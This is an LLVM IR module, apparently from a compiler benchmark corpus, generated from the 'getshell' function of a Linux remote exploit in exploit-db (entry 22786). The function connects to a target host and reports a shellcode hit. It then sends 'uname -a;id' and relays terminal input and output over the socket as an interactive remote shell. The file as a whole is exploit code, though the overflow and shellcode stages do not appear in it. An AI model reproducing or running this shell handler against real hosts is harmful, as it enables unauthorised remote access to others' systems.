; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22786.c_getshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22786.c_getshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"getshell() socket failed\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"couldn't resolve hostname\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"(hit shellcode at 0x%.8x(+%ld))\0A\0A\00", align 1
@BASE_ADDR = common dso_local global i32 0, align 4
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [13 x i8] c"uname -a;id\0A\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"getshell(): select() failed\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"getshell(): read() failed\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"getshell(): write() failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getshell(i8* %0, i16 zeroext %1, i64 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i64 %2, i64* %6, align 8
  %13 = load i32, i32* @AF_INET, align 4
  %14 = load i32, i32* @SOCK_STREAM, align 4
  %15 = load i32, i32* @IPPROTO_TCP, align 4
  %16 = call i32 @socket(i32 %13, i32 %14, i32 %15)
  store i32 %16, i32* %7, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %20

18:                                               ; preds = %3
  %19 = call i32 @printe(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %20

20:                                               ; preds = %18, %3
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %21, i32* %22, align 4
  %23 = load i8*, i8** %4, align 8
  %24 = call i32 @inet_addr(i8* %23)
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %26 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i32 0, i32 0
  store i32 %24, i32* %26, align 4
  %27 = icmp ne i32 %24, 0
  br i1 %27, label %28, label %42

28:                                               ; preds = %20
  %29 = load i8*, i8** %4, align 8
  %30 = call %struct.hostent* @gethostbyname(i8* %29)
  store %struct.hostent* %30, %struct.hostent** %11, align 8
  %31 = icmp ne %struct.hostent* %30, null
  br i1 %31, label %34, label %32

32:                                               ; preds = %28
  %33 = call i32 @printe(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %34

34:                                               ; preds = %32, %28
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %36 = bitcast %struct.TYPE_2__* %35 to i8*
  %37 = load %struct.hostent*, %struct.hostent** %11, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 0
  %39 = load i64, i64* %38, align 8
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @memcpy(i8* %36, i8* %40, i32 4)
  br label %42

42:                                               ; preds = %34, %20
  %43 = load i16, i16* %5, align 2
  %44 = call i32 @htons(i16 zeroext %43)
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 %44, i32* %45, align 4
  %46 = load i32, i32* @SIGALRM, align 4
  %47 = load i32, i32* @sig_alarm, align 4
  %48 = call i32 @signal(i32 %46, i32 %47)
  %49 = load i32, i32* @TIMEOUT, align 4
  %50 = call i32 @alarm(i32 %49)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %53 = call i64 @connect(i32 %51, %struct.sockaddr* %52, i32 12)
  %54 = icmp ne i64 %53, 0
  br i1 %54, label %55, label %60

55:                                               ; preds = %42
  %56 = load i32, i32* @stderr, align 4
  %57 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @close(i32 %58)
  br label %117

60:                                               ; preds = %42
  %61 = call i32 @alarm(i32 0)
  %62 = load i32, i32* @stderr, align 4
  %63 = load i32, i32* @BASE_ADDR, align 4
  %64 = load i64, i64* %6, align 8
  %65 = call i32 (i32, i8*, ...) @fprintf(i32 %62, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 %63, i64 %64)
  %66 = load i32, i32* @SIGINT, align 4
  %67 = load i32, i32* @SIG_IGN, align 4
  %68 = call i32 @signal(i32 %66, i32 %67)
  %69 = load i32, i32* %7, align 4
  %70 = call i32 @write(i32 %69, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0), i32 13)
  br label %71

71:                                               ; preds = %60, %116
  %72 = call i32 @FD_ZERO(i32* %9)
  %73 = call i32 @FD_SET(i32 0, i32* %9)
  %74 = load i32, i32* %7, align 4
  %75 = call i32 @FD_SET(i32 %74, i32* %9)
  %76 = load i32, i32* %7, align 4
  %77 = add nsw i32 %76, 1
  %78 = call i32 @select(i32 %77, i32* %9, i32 0, i32 0, i32 0)
  %79 = icmp slt i32 %78, 1
  br i1 %79, label %80, label %82

80:                                               ; preds = %71
  %81 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0), i32 0)
  br label %117

82:                                               ; preds = %71
  %83 = call i64 @FD_ISSET(i32 0, i32* %9)
  %84 = icmp ne i64 %83, 0
  br i1 %84, label %85, label %101

85:                                               ; preds = %82
  %86 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %87 = call i32 @read(i32 0, i8* %86, i32 4096)
  store i32 %87, i32* %8, align 4
  %88 = icmp slt i32 %87, 1
  br i1 %88, label %89, label %91

89:                                               ; preds = %85
  %90 = call i32 @printe(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i32 0)
  br label %117

91:                                               ; preds = %85
  %92 = load i32, i32* %7, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %94 = load i32, i32* %8, align 4
  %95 = call i32 @write(i32 %92, i8* %93, i32 %94)
  %96 = load i32, i32* %8, align 4
  %97 = icmp ne i32 %95, %96
  br i1 %97, label %98, label %100

98:                                               ; preds = %91
  %99 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0), i32 0)
  br label %117

100:                                              ; preds = %91
  br label %101

101:                                              ; preds = %100, %82
  %102 = load i32, i32* %7, align 4
  %103 = call i64 @FD_ISSET(i32 %102, i32* %9)
  %104 = icmp ne i64 %103, 0
  br i1 %104, label %105, label %116

105:                                              ; preds = %101
  %106 = load i32, i32* %7, align 4
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %108 = call i32 @read(i32 %106, i8* %107, i32 4096)
  store i32 %108, i32* %8, align 4
  %109 = icmp slt i32 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %105
  %111 = call i32 @exit(i32 0) #3
  unreachable

112:                                              ; preds = %105
  %113 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %114 = load i32, i32* %8, align 4
  %115 = call i32 @write(i32 1, i8* %113, i32 %114)
  br label %116

116:                                              ; preds = %112, %101
  br label %71

117:                                              ; preds = %98, %89, %80, %55
  ret void
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
